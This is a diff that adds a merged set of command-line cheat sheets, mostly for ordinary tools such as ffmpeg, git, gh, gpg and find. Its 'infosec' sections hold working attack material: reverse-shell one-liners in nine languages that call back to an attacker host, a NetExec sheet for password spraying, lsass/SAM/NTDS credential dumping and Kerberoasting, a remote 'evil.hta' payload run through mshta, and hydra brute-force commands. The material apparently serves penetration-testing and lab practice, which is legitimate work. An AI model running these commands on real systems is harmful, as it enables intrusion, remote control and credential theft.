@@ -1,0 +1,6990 @@
+NONE OF THESE ARE MINE. I AM WORKING ON MERGING THEM FOR MY USE CASE
+==> awk.cheat <==
+% awk, text
+
+# 文件按列过滤打印
+cat <input_text> | awk '{print $1,$2,$3}'
+
+# 文件按列去重
+cat <input_text> | uniq
+
+# 文件搜索列
+cat <input_text> | awk '{if ($2=="<search_text>") {print $1,$2,$3} }' 
+
+# 文件去重后输出重复行数
+cat <input_text> | uniq | wc -l
+
+
+==> cheats__tarball.cheat <==
+
+==> chrt.cheat <==
+% linux, scheduler
+
+# Show the assigned policy and priority for process ID 1234
+
+chrt --pid <pid>
+
+# Runs a command with a fairly low priority as a batch task (SCHED_BATCH)
+
+chrt --batch <priority> <command>
+
+# Assign SCHED_OTHER policy with priority 0 for process ID 1234
+
+chrt --other --pid <priority> <pid>
+
+
+
+==> cs__throw-expression.cheat <==
+% throw, expression, syntax, c#, cs, .net
+
+# Throw expression as assignment check
+
+Arg = arg ?? throw new System.ArgumentNullException(nameof(arg));
+
+# Throw expression within property
+
+string Name \
+{ \
+	get name; \
+	set => name = value \
+				?? throw new ArgumentNullException(nameof(name)); \
+}
+
+
+==> ffmpeg_1.cheat <==
+% ffmpeg
+
+# translate
+ffmpeg \
+  -i "<input>" \
+  -filter:v scale=h='min(720\,ih)':w='min(1280\,iw)' \
+  -vcodec libx264 \
+  -preset <preset> \
+  -profile:v <profile> \
+  -acodec aac \
+  -ac 2 \
+  -ar 44100 \
+  "<output>" \
+  -hide_banner
+
+$ input : ls
+$ preset : echo -e "ultrafast\nsuperfast\nveryfast\nfaster\nfast\nmedium\nslow\nslower\nveryslow"
+$ profile : echo -e "baseline\nmain\nhigh"
+
+
+==> ffmpeg_2.cheat <==
+% ffmpeg, video
+
+# ffmpeg 视频文件进行ts切片
+ffmpeg -i <input_video> -c copy -map 0 -f segment -segment_list playlist.m3u8 -segment_time 5 output%03d.ts 
+
+# ffmpeg 发送 H264裸流
+ffmpeg -re -i ./IMG_1330.h264 -vcodec copy -f rtp rtp://127.0.0.1:6666>video.sdp
+ffmpeg -re -fflags +genpts -i ./IMG_1330.h264 -vf fps=30 -f rtp rtp://127.0.0.1:6666>video.sdp
+
+# ffmpeg 接收RTP流保存ts文件
+ffmpeg -protocol_whitelist rtp,udp,sdp,file -i video.sdp -c:v libx264 -c:a copy -f segment -segment_time 4 -segment_list test.m3u8 -segment_format mpegts stream%05d.ts
+ffmpeg -protocol_whitelist rtp,udp,sdp,file -i video.sdp -vf fps=30 -f hls -hls_time 3 -hls_playlist_type vod test.m3u8
+ffmpeg -protocol_whitelist rtp,udp,sdp,file -i video.sdp -vf fps=30 -f segment -segment_time 3 -segment_list test.m3u8 -segment_format mpegts stream%03d.ts
+
+# ffmpeg打开摄像头获取数据, 以RTP流形式发出
+ffmpeg -f avfoundation -framerate 30 -i "0" -target pal-vcd -f rtp rtp://127.0.0.1:6666>video.sdp
+
+# ffplay播放 rtmp流
+ffplay -i rtmp://localhost:1935/rtmplive/room
+
+# ffmpeg 下载m3u8的分片并合并
+ffmpeg -i "https://www.48iuz.com/20190207/AZWT115x/index.m3u8" -c copy media.mp4
+==> ffmpeg.cheat <==
+% ffmpeg, video
+
+# Get Video Info
+ffmpeg -i <video_file> -hide_banner
+
+# Extract Images from a Video into separate image files named image1.jpg, image2.jpg, and so on.
+ffmpeg -i <video_file> <cideo_file>_%d.jpg
+
+# Convert Images into Video - which will take all the images in the current folder (like "image1.jpg", "image2.jpg", etc.) 
+ffmpeg -f image2 -i image%d.jpg imagestovideo.mpg
+
+# Convert a Video to MP3 Format 
+ffmpeg -i <video_file> -vn -ar 44100 -ac 2 -ab 192 -f mp3 <video_file>.mp3
+
+# Convert Video to an animated, uncompressed gif file
+ffmpeg -i <video_file> <video_file>.gif
+
+# To convert a .avi file to an mpeg for dvd players
+ffmpeg -i <video_file>.avi -target pal-dvd -ps 2000000000 -aspect 16:9 <video_file>.mpeg
+
+# Extract audio or sound from a video file, and save it as MP3 file, use the following command:
+ffmpeg -i >video_file> -vn -ar 44100 -ac 2 -ab 192 -f mp3 <video_file>.mp3
+
+# Combine an audio file and a video file into a single multimedia file
+ffmpeg -i <audio_file> -i <video_file> <video_file>_w_audio.mpg
+
+# Increase video playback speed, run the following command with the -vf option, which sets the video filters that help to adjust the playback speed.
+ffmpeg -i <video_file> -vf "setpts=0.5*PTS" fast_<video_file>
+
+# Decrease video playback speed, run the following command with the -vf option, which sets the video filters that help to adjust the playback speed.
+ffmpeg -i <video_file> -vf "setpts=4.0*PTS" slow_<video_file> hide_banner
+
+# Add subtitle to a video file
+ffmpeg -i <video_file> -i <subtitle_file> -map 0 -map 1 -c copy -c:v libx264 -crf 23 -preset veryfast out_<video_file>
+
+# Add a cover poster or image to an audio file
+ffmpeg -loop 1 -i <image_file> -i <audio_file> -c:v libx264 -c:a aac
+==> file.cheat <==
+% file, find, search, zip
+
+# 当前目录查找文件
+find . -maxdepth 1 -name "<name>"
+
+# 从当前目录开始递归查找文件
+find . -name "<name>"
+
+# 列出某个目录下的所有文件
+find <dir> -type f -follow -print
+
+# 压缩某个目录下的所有文件(保留目录结构)
+find <dir> -type f -follow -print | zip <ZipFileName> -@
+
+# 压缩某个目录下的所有文件(忽略目录结构)
+find <dir> -type f -follow -print | zip -j <ZipFileName> -@
+
+
+# 压缩某个目录下的指定文件(保留目录结构)
+find <dir> -type f -name "<name>"  -follow -print | zip -@ <ZipFileName>  
+
+
+# 压缩某个目录下的指定文件(忽略目录结构)
+find <dir> -type f -name "<name>"  -follow -print | zip -j -@ <ZipFileName>  
+
+# 删除目录下的指定类型文件
+find <dir>  -type f -name '*.<suffix>' -exec rm -f {} \;
+==> fswatch.cheat <==
+% file change monitor
+
+# list available monitors by employing the -M or - list-monitors option:
+fswatch -M
+
+# list available monitors by employing the -M or - list-monitors option:
+fswatch --list-monitors
+
+# Set the latency in seconds, the default being 1 second.
+fswatch -l <latency> <file>
+
+# Using -t or --timestamp option prints the time stamp for every event
+fswatch --timestamp <file>
+
+# -x or --event-flags tells fswatch to print the event flags alongside the event path
+fswatch --events-flags <file>
+
+# To print the numeric value of an event indicating changes in your home directory and /var/log/auth.log file, use -n or --numeric option as below:
+fswatch --numeric <file>
+
+==> fuser.cheat <==
+% linux, process, files, sockets
+
+# Show which processes have TCP port xx socket open including details
+
+fuser --verbose --ipv4 <port>/<protocol>
+
+# Select namespace 'tcp' and select port xx to see which processes have the socket open with verbose for details
+
+fuser --verbose --namespace tcp <port>
+
+# Show all processes that have a file open at the specified mount point
+
+fuser --verbose --mount <mountpoint>
+==> git__add.cheat <==
+% git, add, changes
+
+# Stages all Changes
+git add -A
+
+# Stages new files and modifications, without deletions (on the current directory and its subdirectories).
+git add .
+
+# Stages modifications and deletions, without new files
+git add -u
+==> git.cheat <==
+% git, code
+
+# 覆盖提交
+git commit --amend
+
+# 查找丢失的提交记录
+git reflog
+
+# 统计某个用户的提交次数和行数
+git log --author=<name> --pretty=tformat: --numstat | awk '{ add += $1 ; subs += $2 ; loc += $1 - $2 } END { printf "added lines: %s removed lines : %s total lines: %s\n",add,subs,loc }'
+
+# 统计所有人的提交次数
+git shortlog -s -n
+
+# 删除远程tag
+git push origin :refs/tags/<tag>
+
+# 删除远程分支
+git push origin :<remote_branch>
+
+$ remote_branch: git ls-remote --- --column 1
+
+
+# 生成两个提交之间的patch(包含两个commit)
+git format-patch <commit1>..<commit2>
+
+# 生成某个提交的patch
+git format-patch -1 <commit>
+
+$ commit: git log -20 --oneline --- --column 0
+
+# 检查patch文件
+git apply --stat <patch>
+
+
+# 检查patch文件是否可以使用
+git apply --check <patch>
+
+
+# 使用patch文件
+git am -s < <patch>
+
+$ patch: find . -name '*.patch'
+
+
+# 查看当前分支结构
+git log --graph --decorate --oneline --simplify-by-decoration --all
+
+
+# 查看当前分支结构(gitk)
+gitk --simplify-by-decoration --all
+
+
+# 查看总提交次数
+git rev-list HEAD --count
+
+
+# 查看某个用户提交汇总
+git log --author="<name>" --pretty=tformat: --numstat | awk '{ add += $1; subs += $2; loc += $1 - $2 } END { printf "added lines: %s, removed lines: %s, total lines: %s\n", add, subs, loc }'
+==> git__config.cheat <==
+% git, config, email, user
+
+    # Config username
+git config --global user.name <name>
+
+# Config email
+git config --global user.email <email>
+
+# Config default git editor
+git config --global core.editor <editor:emacs/vim/nvim/code>
+
+# Check config
+git config --list
+==> git__gh.cheat <==
+% github, github-cli, gh
+
+# Login with gh
+gh auth login
+
+% github, github-cli, gh, api
+
+# Get starred repos by authenticated user (table with only name and description)
+gh api \
+  -H "Accept: application/vnd.github+json" \
+  -H "X-GitHub-Api-Version: 2022-11-28" \
+  -H "per_page: 100" \
+  /user/starred --jq ".[] | [.name, .description] | @tsv"
+
+# print only specific fields from the response
+gh api repos/<owner>/<repo>/issues --jq '.[].title'
+
+# use a template for the output
+gh api repos/<owner>/<repo>/issues --template \
+  '{{range .}}{{.title}} ({{.labels | pluck "name" | join ", " | color "yellow"}}){{"\n"}}{{end}}'
+
+# list releases with GraphQL
+gh api graphql -F owner='{owner}' -F name='{repo}' -f query='
+  query($name: String!, $owner: String!) {
+    repository(owner: $owner, name: $name) {
+      releases(last: 3) {
+        nodes { tagName }
+      }
+    }
+  }
+'
+
+# list all repositories for a user
+gh api graphql --paginate -f query='
+  query($endCursor: String) {
+    viewer {
+      repositories(first: 100, after: $endCursor) {
+        nodes { nameWithOwner }
+        pageInfo {
+          hasNextPage
+          endCursor
+        }
+      }
+    }
+  }
+'
+
+# Lists the feeds available to the authenticated user. 
+
+gh api \
+  -H "Accept: application/vnd.github+json" \
+  -H "X-GitHub-Api-Version: 2022-11-28" \
+  /feeds
+==> git__git.cheat <==
+% git
+
+# Get branch name of current branch
+git symbolic-ref --short HEAD
+
+# Remove branches that have already been merged with main a.k.a. ‘delete merged'
+git branch --merged | grep -v '\*\|master\|main\|dev' | xargs -n 1 git branch -d
+
+# Find tags containing commit
+git describe --always --contains <commit_id>
+
+# Find branches containing commit
+git branch -a --contains <commit_id>
+
+# Show the diff between the latest commit and the current state
+git diff-index --quiet HEAD -- || clear; git --no-pager diff --patch-with-stat
+
+# List config from ~/.gitconfig.user
+git config --file ~/.gitconfig.user -l
+
+# Configure user and mail in ~/.gitconfig.user
+git config --file ~/.gitconfig.user  user.name <author_name> /
+git config --file ~/.gitconfig.user  user.email <email>
+
+# Change author of a commit
+git commit --amend --author="<author_name> \<<email>\>"
+
+# Re-sign previous commits with a new gpg key
+git rebase <commit> --exec 'git commit --amend --no-edit -S'
+
+# List modified files
+git status --porcelain | awk 'match($1, "M"){print $2}'
+
+# List deleted files
+git status --porcelain | awk 'match($1, "D"){print $2}'
+
+# List staged files
+git diff --name-only --cached
+
+# List staged files only added and modified
+git diff --name-only --cached --diff-filter=AM
+
+# List stages files and the working directory only
+comm -23 <(git diff --cached --name-only) <(git diff --name-only)
+
+==> git__glab.cheat <==
+% gitlab, glab, gitlab-cli
+
+
+% gitlab, glab, gitlab-cli, repos
+
+# create a repository under your account using the current directory name
+glab repo create
+  
+# create a repository under a group using the current directory name
+glab repo create --group <group>
+
+# create a repository with a specific name
+glab repo create <repo>
+  
+# create a repository for a group
+glab repo create <group>/<repo>
+
+
+==> gitguardian.cheat <==
+% gitguardian, vulnerabilities
+@ gitguardian, secrets
+
+# search for secrets in files
+ggshield secret scan path -r <path>
+
+# search for secrets in repo
+ggshield secret scan repo -r <path>
+
+# search for secrets in docker images
+ggshield secret scan docker <image>:<tag>
+
+# search for secrets in Pypi packages
+ggshield secret scan pypi <package>
+
+@ gitguardian, vulnerabilities
+
+# search for vulnerabilities in your IaC files
+ggshield iac scan all <path>
+
+# search for new potential IaC vulnerabilities
+ggshield iac scan diff --ref=HEAD~1 . 
+
+
+==> git__remote.cheat <==
+% git, remote, origin
+
+# Add remote repo
+git remote add origin <url>
+
+# Verify remote added repo
+git remove -v
+
+==> gnome.cheat <==
+% gnome
+
+# set default terminal application
+gsettings set org.gnome.desktop.default-applications.terminal exec <console>
+
+# dump dconf to file
+dconf dump <path> > dump.dconf
+
+==> gpg.cheat <==
+% gpg
+$ key_name: gpg --list-keys --with-colons | awk -F: '$1 == "uid" {print $8" "$10}' --- --column 1 --delimiter ' '
+
+# Export Public Key as armored ASCII
+gpg --output <output_filename> --armor --export <key_name>
+
+# List pgp keys
+gpg --list-keys --with-colons | awk -F: '$1 == "uid" {print $8 "\t" $10 }'
+
+# To locate the key of a user, by email address:
+gpg --auto-key-locate keyserver --locate-keys <email>
+
+# Refresh all your keys (e.g. new revocation certificates and subkeys)
+gpg --refresh-keys
+
+# Upload and verify key to keys.openpgp.org
+gpg --export <email> | curl -T - https://keys.openpgp.org
+
+# Generate revoke key
+gpg --output revoke.asc --gen-revoke <key_name>
+
+# Import revocation certificate into your keyring
+gpg --import revoke.asc
+
+# Search your key on the keyserver
+gpg --keyserver <keyserver> --search-key <key_name>
+
+# Generate a lot of random passwords
+gpg --gen-random --armor 1 
+
+# Generate a random password of a given lenght
+gpg --gen-random --armor 1 <length>
+==> infosec__evil-winrm.cheat <==
+% Evil-WinRM
+
+;$ ip: $ip
+;$ username: ''
+;$ password:  ''
+
+# Connect to WinRM with Username/Password
+docker run --rm -tiv $PWD:/data --name evil-winrm oscarakaelvis/evil-winrm -i <ip> -u '<username>' -p '<password>'
+
+==> infosec__fuzzers.cheat <==
+% Fuzzers
+
+$ target: if [[ ! -z $target ]]; then echo $target; fi
+$ scheme: echo "http https" | tr " " "\n"
+$ wordlists: fdfind . /usr/share/{seclists,wordlists} /usr/share/amass/ -Ltf | sort -u
+$ file_exts: echo "php txt cgi html htm js css png jpg jpeg gif svg bmp" | tr ' ' '\n' --- --multi --map "navi fn map::expand"
+$ file_exts_comma: echo "<file_exts>" | tr ' ' ','
+
+# Feroxbuster (faster)
+
+feroxbuster -eBEg --auto-tune --scan-limit 3 -u <scheme>://<target> --wordlist <wordlists>
+
+# Feroxbuster (slower [exts: php txt cgi html js])
+
+feroxbuster -eBEg --auto-tune --scan-limit 3 -u <scheme>://<target> --wordlist <wordlists> -x <file_exts>
+
+# Gobuster (faster)
+
+gobuster -t 15 dir -u <scheme>://<target> -w <wordlists> | tee <target>.$(basename $PWD).gobuster.txt
+
+# Gobuster (slower [exts: php txt cgi html js])
+
+gobuster -t 15 dir -u <scheme>://<target> -w <wordlists> -x <file_exts_comma> | tee <target>.$(basename $PWD).gobuster-extended.txt
+
+# wfuzz (POST [required:FUZZ in params])
+
+wfuzz -c -z range,<min_range>-<max_range> -d "<params>" -X POST -u <target>
+
+# ffuf
+
+ffuf smth smth smth todo:(RitchieS)
+
+# hydra [ssh] (user/password file)
+
+hydra -L users.txt -P pass.txt <target> -t 16 ssh
+
+# hydra [ftp] (user/password file)
+
+hydra -L users.txt -P pass.txt <target> -t 16 ftp
+
+# hydra [ssh] (user file/static password) 
+
+hydra -L users.txt -P <pass> <target> -t 16 ssh
+
+# hydra [ftp] (user file/static password)
+
+hydra -L users.txt -P <pass> <target> -t 16 ftp
+
+# hydra [ssh] (static user/password file) 
+
+hydra -L <user> -P pass.txt <target> -t 16 ssh
+
+# hydra [ftp] (static user/password file)
+
+hydra -L <user> -P pass.txt <target> -t 16 ftp
+
+==> infosec__mssqlclient.cheat <==
+% Impacket MSSQL Client
+
+;$ ip: $ip
+;$ username: ''
+;$ password:  ''
+
+# MSSQLClient connect with username/password
+mssqlclient.py -show '<username>':'<password>'@<ip> -windows-auth
+
+==> infosec__netexec.cheat <==
+% NetExec / CrackMapExec
+
+;$ ip: $ip
+;$ username: ''
+;$ password:  ''
+;$ relay-file: 'relay-list.txt'
+;$ command: 'mshta.exe http://<ip>/evil.hta'
+
+# SMB Connectivity Check
+nxc smb <ip>
+
+
+## Enumerating SMB shares
+
+# SMB Share NULL session
+nxc smb <ip> -u '' -p ''
+# SMB Share Anonymous session
+nxc smb <ip> -u 'anonymous' -p '' --local-auth
+# SMB Share Guest session
+nxc smb <ip> -u 'guest' -p ''
+# SMB Share Authenticated session
+nxc smb <ip> -u '<username>' -p '<password>'  # or -H '<hash>'
+
+
+## Spider SMB shares
+
+# Spider SMB Share NULL session
+nxc smb <ip> -u '' -p '' -M spider_plus
+# Spider SMB Share Anonymous session
+nxc smb <ip> -u 'anonymous' -p '' --local-auth -M spider_plus
+# Spider SMB Share Guest session
+nxc smb <ip> -u 'guest' -p '' -M spider_plus
+# Spider SMB Share Authenticated session
+nxc smb <ip> -u '<username>' -p '<password>' -M spider_plus
+
+# Spider+Download SMB Share NULL session
+nxc smb <ip> -u '' -p '' -M spider_plus -o DOWNLOAD_FLAG=true OUTPUT_FOLDER=.
+# Spider+Download SMB Share Anonymous session
+nxc smb <ip> -u 'anonymous' -p '' --local-auth -M spider_plus -o DOWNLOAD_FLAG=true OUTPUT_FOLDER=.
+# Spider+Download SMB Share Guest session
+nxc smb <ip> -u 'guest' -p '' -M spider_plus -o DOWNLOAD_FLAG=true OUTPUT_FOLDER=.
+# Spider+Download SMB Share Authenticated session
+nxc smb <ip> -u '<username>' -p '<password>' -M spider_plus -o DOWNLOAD_FLAG=true OUTPUT_FOLDER=.
+
+
+## Working files on with SMB Shares
+
+# NetExec SMB Upload file on remote
+nxc smb <ip> -u '<username>' -p '<password>' --put-file <local-file> <remote-file>
+# NetExec SMB Download file from remote
+nxc smb <ip> -u '<username>' -p '<password>' --get-file <remote-file> <local-file>
+
+
+# Get SMB relays with no SMB signing
+nxc smb <ip> --gen-relay-list <relay-file>
+
+
+# Execute Command or file
+nxc smb <ip> -u '<username>' -p '<password>' -x '<command>'
+
+
+## Enumerating Password Policy
+
+# Password Policy NULL session
+nxc smb <ip> -u '' -p '' --pass-pol
+# Password Policy Anonymous session
+nxc smb <ip> -u 'anonymous' -p '' --local-auth --pass-pol
+# Password Policy Guest session
+nxc smb <ip> -u 'guest' -p '' --pass-pol
+# Password Policy Authenticated session
+nxc smb <ip> -u '<username>' -p '<password>' --pass-pol
+
+
+## SMB password spraying
+
+# SMB Password Spray with user/pass list
+nxc smb <ip> -u user.txt -p pass.txt
+
+# SMB Password Spray with user/pass list (contiunue/no bruteforcing)
+nxc smb <ip> -u user.txt -p pass.txt --continue-on-success --no-bruteforce
+
+
+## Enumerating Users
+
+# Enumerate Users NULL session (SMB)
+nxc smb <ip> -u '' -p '' --users
+# Enumerate Users NULL session (LDAP)
+nxc ldap <ip> -u '' -p '' --users
+# Enumerate Users Anonymous session (SMB)
+nxc smb <ip> -u 'anonymous' -p '' --local-auth --users
+# Enumerate Users Anonymous session (LDAP)
+nxc ldap <ip> -u 'anonymous' -p '' --local-auth --users
+# Enumerate Users Guest session (SMB)
+nxc smb <ip> -u 'guest' -p '' --users
+# Enumerate Users Guest session (LDAP)
+nxc ldap <ip> -u 'guest' -p '' --users
+# Enumerate Users Authenticated session (SMB)
+nxc smb <ip> -u '<username>' -p '<password>' --users
+# Enumerate Users Authenticated session (LDAP)
+nxc ldap <ip> -u '<username>' -p '<password>' --users
+
+# Enumerate users by bruteforcing the RID + save users list (10000 is optional)
+nxc smb <ip> -u guest -p '' --rid-brute 10000 --log rid-brute.txt
+# Enumerate Logged-on Users (Authenticated)
+nxc smb <ip> -u '<username>' -p '<password>' --loggedon-users
+
+# Get user's description
+nxc ldap <ip> -u '<username>' -p '<password>' -M get-desc-users
+
+
+## Enumerating Groups
+
+# Enumerate Groups NULL session
+nxc smb <ip> -u '' -p '' --groups
+# Enumerate Groups Anonymous session
+nxc smb <ip> -u 'anonymous' -p '' --local-auth --groups
+# Enumerate Groups Guest session
+nxc smb <ip> -u 'guest' -p '' --groups
+# Enumerate Groups Authenticated session
+nxc smb <ip> -u '<username>' -p '<password>' --groups
+
+
+## FTP
+
+# List files on FTP server
+nxc ftp <ip> -u '<username>' -p '<password>' --ls
+# List files on FTP server (specific path)
+nxc ftp <ip> -u '<username>' -p '<password>' --ls '<path>'
+# Download file from FTP server (specific path)
+nxc ftp <ip> -u '<username>' -p '<password>' --get '<file>'
+# Upload file from attacker to FTP server (specific path)
+nxc ftp <ip> -u '<username>' -p '<password>' --put <LOCAL_FILE> <REMOTE_FILE>
+
+# Asreproast- Get and try cracking user account hash
+nxc ldap <ip> -u '<username>' -p '' --asreproast asreproast.txt --kdcHost <ip>
+# Impacket Asreproast
+GetNPUsers.py <target> -usersfile users.txt -dc-ip <ip>
+# Kerberoasting - Get and try cracking SPN account hash
+nxc ldap <ip> -u '<username>' -p '<password>' --kerberoasting kerberoasting.txt --kdcHost <ip>
+# Impacket Kerberoasting
+GetUserSPNs.py -usersfile users.txt -no-pass -dc-ip <ip> -dc-host <ip> <target> -target-domain <domain>
+
+## NetExec Query LDAP
+
+
+# NetExec Query LDAP (example 1)
+nxc ldap <ip> -u '' -p '' --query "(objectclass=*)" ""
+# NetExec Query LDAP (example 2)
+nxc ldap <ip> -u '' -p '' --query "(sAMAccountName=<username>)" ""
+# LDAPSearch Query LDAP
+ldapsearch -o ldif_wrap=no -xLLLH ldap://<ip> -D '<domain>\<username>' -w '<password>' -b "DC=intelligence,DC=htb" '(samaccountname=<username>)'
+
+
+## Passwords
+
+# Extract the SAM File + Dump Cached Passwords
+nxc smb <ip> -u '<username>' -p '<password>' --sam --lsa --dpap
+# Dump lsass with lsassy module:
+nxc smb <ip> -u '<username>' -p '<password>' -M lsassy -o METHOD=comsvcs_stealth
+# Extract passwords from the NTDS (dcsync)
+nxc smb <ip> -d <domain> -u '<username>' -p '<password>' --ntds
+
+## Get GPP policies
+
+# `gpp_password` decrypts passwords stored in the Group.xml file
+nxc smb <dc-ip> -u '' -p '' -M gpp_password
+# `gpp_autologin` retrieves autologin information from the Registry.xml file
+nxc smb <dc-ip> -u '' -p '' -M gpp_autologin
+
+## Group Managed Service Accounts (gMSA)
+
+# Requirements: user that can read msDS-ManagedPassword (Domain Admins cant read it by defualt)
+nxc ldap <ip> -u '<username>' -p '<password>' --gmsa
+
+## LAPS (Local administrator password solution) - retrieves both LAPS v1 and v2 passwords
+
+# Requirements: Domain Admins or user that have Read/WriteProperty to the ms-MCS-AdmPwd attribute
+nxc smb <ip> -u '<username>' -p '<password>' --laps    # add --lsa use the laps admin to dump lsa
+
+## Check for Spooler Service
+nxc smb <ip> -u '<username>' -p '<password>' -M spooler
+
+## Check for WebDav Service
+nxc smb <ip> -u '<username>' -p '<password>' -M webdav
+
+## Azure - Entra Connect Sync service username looks like 'MSOL_16fb75d0227d'
+
+# Microsoft Online
+nxc smb <ip> -u '<username>' -p '<password>' -M msol # Requirements: 'ADSyncAdmins' or 'local Administrators groups' on machine with AD Connect service to get the MSOL account password and dcsync with it
+# Microsoft Online #2
+nxc smb <ip> -u '<username>' -p '<password>' -M msol -o MSOL_PS1=C:\...\nxc\data\msol_dump\msol_dump.ps1
+
+
+## mssql_priv
+
+# NetExec MsSQL (Check authentication)
+nxc mssql <ip> -u '<username>' -p '<password>' --local-auth --port 1434
+# NetExec MsSQL (privesc module)
+nxc mssql <ip> -u '<username>' -p '<password>' -M mssql_priv -o ACTION=privesc
+# NetExec MsSQL: Execute Windows Commands (xp_cmdshell)
+nxc mssql <ip> -u sa -p '<password>' --local-auth -x whoami
+# Execute MSSQL commands
+nxc mssql <ip> -u '<username>' -p '<password>' --local-auth -q 'SELECT name FROM master.dbo.sysdatabases;'
+
+
+## WMI
+
+# WMI: Execute Commands
+nxc wmi <ip> -u '<username>' -p '<password>' -x whoami
+
+
+## Read DACL Rights
+
+# Read all the ACEs of a user
+nxc ldap <dc-ip> -u '<username>' -p '<password>' --kdcHost <dc-ip> -M daclread -o TARGET=<username> ACTION=read
+# Read all rights PRINCIPAL user have on TARGET user
+nxc ldap <dc-ip> -u '<username>' -p '<password>' --kdcHost <dc-ip> -M daclread -o TARGET=<t_user> ACTION=read PRINCIPAL=<p_user>
+# Find users with DCSync rights on this domain
+nxc ldap <dc-ip> -u '<username>' -p '<password>' --kdcHost <dc-ip> -M daclread -o TARGET_DN="DC=htb,DC=LOCAL" ACTION=read RIGHTS=DCSync
+
+## Enumerate Domain Trusts
+nxc ldap <ip> -u '<username>' -p '<password>' -M enum_trusts
+
+==> infosec__reverse-shells.cheat <==
+% Reverse Shells
+
+$ local_ip: echo $(ip -br a sh dev tun0 2>/dev/null||ip -br a sh dev eth0) | awk '{print $3}' | cut -d '/' -f1
+$ port: echo '443 1234 4444 32000' | tr ' ' '\n'
+$ shell: echo '/bin/bash /bin/zsh /bin/ash /bin/dash /bin/ksh /bin/sh bash zsh ash dash ksh sh' | tr ' ' '\n'
+
+# bash
+
+bash -c 'exec <shell> -i &>/dev/tcp/<local_ip>/<port> <&1'
+
+# zsh
+
+zsh -c 'zmodload zsh/net/tcp && ztcp <local_ip> <port> && zsh >&$REPLY 2>&$REPLY 0>&$REPLY'
+
+# netcat
+
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|<shell> -i 2>&1|nc <local_ip> <port> >/tmp/f
+
+# php
+
+php -r '$sock=fsockopen("<local_ip>","<port>");exec("<shell> -i <&3 >&3 2>&3");'
+
+
+# powershell
+
+powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('<local_ip>',<port>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
+
+# perl
+
+perl -e 'use Socket;$i="<local_ip>";$p=<port>;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("<shell> -i");};'
+
+# python
+
+python -c 'import os,pty,socket,sys;s=socket.socket();s.connect((("127.0.0.1"),int("<port>")));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("<shell>");'
+
+# ruby
+
+ruby -rsocket -e 'exit if fork;c=TCPSocket.new("<local_ip>","<port>");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
+
+# telnet
+
+TF=$(mktemp -u); mkfifo $TF && telnet <local_ip> <port> 0<$TF | <shell> 1>$TF
+
+# stabilized fancy beefy gordita crunch shell
+
+stty raw -echo; (echo 'python3 -c "import pty;pty.spawn(\"<shell>\")" || python -c "import pty;pty.spawn(\"<shell>\")"' ;echo "stty$(stty -a | awk -F ';' '{print $2 $3}' | head -n 1)"; echo reset; echo id;cat) | nc -lvnp <port> && reset
+
+==> infosec__scanners.cheat <==
+% Scanners
+
+;$ ip:
+$ common_ports: 
+
+# rustscan
+sudo rustscan -b 8192 -u 16384 -a <ip> -- -sS -sV -sC -oN <ip>.$(basename $PWD).nmap.txt
+
+# rustscan (higher timeout + retries)
+sudo rustscan -t 3000 --tries 2 -b 8192 -u 16384 -a <ip> -- -sS -sV -sC -oN <ip>.$(basename $PWD).nmap.txt
+
+# nmap
+sudo nmap -p<ports> -sS -sV -sC -v -oN <ip>.$(basename $PWD).nmap.txt <ip>
+
+# nmap (vuln scripts)
+sudo nmap -p<ports> -sS -sV -sC -v --script=vuln -oN <ip>.$(basename $PWD).nmap.txt <ip>
+
+==> ip.cheat <==
+% ip, udp, tcp, http
+
+# 扫描服务器端口是否开放
+nc -vv <IP> <PORT>
+
+# tcpdump 抓包输出pcap文件
+tcpdump -i eth0 -A -s 0 'dst or src (<host1> or <host2>) and (((ip[2:2] - ((ip[0]&0xf)<<2)) - ((tcp[12]&0xf0)>>2)) != 0)' -w httpdump-2018062711.pcap
+
+
+# 安装tinyproxy代理服务器, 配置文件路径/etc/tinyproxy.conf
+apt install tinyproxy
+
+# 启动tinyproxy代理服务器
+sudo service tinyproxy start
+
+# 重启tinyproxy代理服务器
+sudo service tinyproxy restart
+
+# 停止tinyproxy代理服务器
+sudo service tinyproxy stop
+
+==> lsfd.cheat <==
+% linux, file descriptors
+
+# Show open file descriptors for PIDs
+
+lsfd --pid <pids>
+==> lsns.cheat <==
+% linux, namespaces
+
+# Show all available namespaces
+
+lsns
+==> misc__compression.cheat <==
+% compression
+
+# Create a tar containing files
+tar cf <name>.tar <files>
+
+# Extract the files from a tar
+tar xf <tar_file>
+
+# Create a tar with Gzip compression
+tar czf <name>.tar.gz <files> 
+
+# Extract a tar using Gzip
+tar xzf <targz_file>
+
+# Compress file and appends .gz to its name
+gzip <path>
+
+# Decompress compressed file
+gzip -d <gz_file>
+
+$ path: ls
+$ tar_file: ls *.tar
+$ targz_file: ls *.tar.gz
+$ gz_file: ls *.gz
+
+==> misc__misc.cheat <==
+% Misc Linux & Applications
+
+# Edit filenames in current directory in you $EDITOR
+vidir
+
+# List all processes by user and pipe to less
+ps aux | less
+
+# Untar a gzip'ed file
+tar -xzvf <GzipTarFile>
+
+# Untar a bzip'ed file
+tar -xjvf <BzipTarFile>
+
+# Tar and zip a file or directory (recursively)
+tar -czvf <ArchiveName> <FileOrDirectory>
+
+# Better extraction solution (for unzip, bunzip, untar, etc.)
+dtrx <ZIPedFile>
+
+# Get a json output of all windows in the current i3-wm session
+i3-msg -t get_tree | jq
+
+# Shrink a video
+ffmpeg -i <InputFile> -r 30 -s 960x540 -strict -2 <OutputFile>
+
+# Create blurry background pictures from images in current dir
+mkdir blurrybackgrounds && for i in *.jpg *.JPG *.png *.PNG ; do out=$(uuidgen).jpg ; convert -quality 75 "$i" -strip -auto-orient -resize 4x4 -resize 1920x1080\! "blurrybackgrounds/${out}" ; done
+
+# Screenshot: Whole screen
+scrot
